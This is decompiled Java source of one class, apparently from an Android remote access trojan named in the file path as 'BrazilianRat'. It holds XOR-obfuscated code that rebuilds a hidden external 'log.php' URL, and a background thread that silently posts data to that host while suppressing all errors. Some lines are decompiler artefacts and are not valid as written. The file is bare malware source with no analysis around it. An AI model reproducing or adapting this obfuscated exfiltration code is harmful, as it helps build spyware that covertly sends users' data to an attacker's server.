package com.irifix;

import okhttp3.aa;
import okhttp3.ab;
import okhttp3.v;
import okhttp3.w;
import okhttp3.z;

public class i {
  public static String a() {
    String str = "";
    for (byte b = 0; b < 26; b++) {
      (new int[26])[0] = 104;
      (new int[26])[1] = 117;
      (new int[26])[2] = 118;
      (new int[26])[3] = 115;
      (new int[26])[4] = 119;
      (new int[26])[5] = 63;
      (new int[26])[6] = 41;
      (new int[26])[7] = 40;
      (new int[26])[8] = 113;
      (new int[26])[9] = 108;
      (new int[26])[10] = 103;
      (new int[26])[11] = 101;
      (new int[26])[12] = 101;
      (new int[26])[13] = 110;
      (new int[26])[14] = 32;
      (new int[26])[15] = 108;
      (new int[26])[16] = 127;
      (new int[26])[17] = 124;
      (new int[26])[18] = 61;
      (new int[26])[19] = 127;
      (new int[26])[20] = 123;
      (new int[26])[21] = 114;
      (new int[26])[22] = 56;
      (new int[26])[23] = 103;
      (new int[26])[24] = 112;
      (new int[26])[25] = 105;
      int j = (new int[26])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & (j ^ b)));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static void a(String paramString) {
    (new Thread(new Runnable(paramString) {
          public void run() {
            try {
              w w = new w();
              this();
              v.a a = new v.a();
              this();
              v v = a.a(v.e).a("a", this.a).a();
              z.a a1 = new z.a();
              this();
              ab ab = w.a(a1.a(i.a()).a((aa)v).a()).a();
              if (ab.c())
                ab.f(); 
            } catch (Exception exception) {}
          }
        })).start();
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/i.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */